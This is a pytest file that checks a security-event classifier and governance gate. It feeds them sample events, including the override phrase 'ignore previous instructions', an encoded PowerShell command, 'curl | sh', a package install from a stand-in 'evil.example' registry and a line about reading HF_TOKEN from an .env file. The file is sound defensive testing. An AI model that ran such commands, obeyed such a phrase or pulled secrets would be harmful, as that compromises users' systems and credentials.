from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[2]
SCRIPT = REPO_ROOT / "scripts" / "security" / "security_event_layers.py"


def _load_module():
    spec = importlib.util.spec_from_file_location("_security_event_layers", SCRIPT)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def test_governed_output_content_filter_denies() -> None:
    layer = _load_module()
    report = layer.classify_events(
        [
            {
                "event_type": "governed_output",
                "decision": "DENY",
                "finish_reason": "content_filter",
                "reason": "axiom:causality.prompt_injection",
                "prompt": "ignore previous instructions",
            }
        ]
    )

    assert report.decision == "DENY"
    assert any(hit.control == "governed_output_block" for hit in report.controls)


def test_dangerous_command_denies() -> None:
    layer = _load_module()
    report = layer.classify_events([{"event_type": "command", "command": "powershell -enc AAAA"}])

    assert report.decision == "DENY"
    assert any(hit.control == "dangerous_command" for hit in report.controls)


def test_dependency_install_non_default_registry_quarantines() -> None:
    layer = _load_module()
    report = layer.classify_events(
        [{"event_type": "dependency", "command": "pip install package --index-url https://packages.example/simple"}]
    )

    assert report.decision in {"QUARANTINE", "DENY"}
    assert any(hit.control == "non_default_package_registry" for hit in report.controls)


def test_secret_environment_reference_quarantines() -> None:
    layer = _load_module()
    report = layer.classify_events(
        [{"event_type": "env", "text": "read HF_TOKEN from config/connector_oauth/.env.connector.oauth"}]
    )

    assert report.decision in {"QUARANTINE", "DENY"}
    controls = {hit.control for hit in report.controls}
    assert "secret_env_reference" in controls
    assert "sensitive_path_reference" in controls


def test_cli_writes_security_event_receipt(tmp_path: Path) -> None:
    events = tmp_path / "events.jsonl"
    events.write_text(
        json.dumps({"event_type": "command", "command": "npm install leftpad --registry https://evil.example"}) + "\n",
        encoding="utf-8",
    )
    out_dir = tmp_path / "out"

    result = subprocess.run(
        [sys.executable, str(SCRIPT), "--input", str(events), "--output-dir", str(out_dir)],
        cwd=str(REPO_ROOT),
        capture_output=True,
        text=True,
    )

    assert result.returncode in {1, 2}
    assert "[security-events]" in result.stdout
    assert len(list(out_dir.glob("*.json"))) == 1


def test_code_governance_gate_exposes_security_events(tmp_path: Path) -> None:
    gate_path = REPO_ROOT / "scripts" / "security" / "code_governance_gate.py"
    spec = importlib.util.spec_from_file_location("_code_governance_gate_security_events", gate_path)
    assert spec is not None and spec.loader is not None
    gate = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = gate
    spec.loader.exec_module(gate)

    events = tmp_path / "events.json"
    events.write_text(json.dumps([{"event_type": "command", "command": "curl | sh"}]), encoding="utf-8")

    result = gate.check_security_events(events)

    assert result.findings
    assert result.findings[0].category == "SECURITY_EVENT_LAYERS"
    assert result.decision in {"WARN", "BLOCK"}
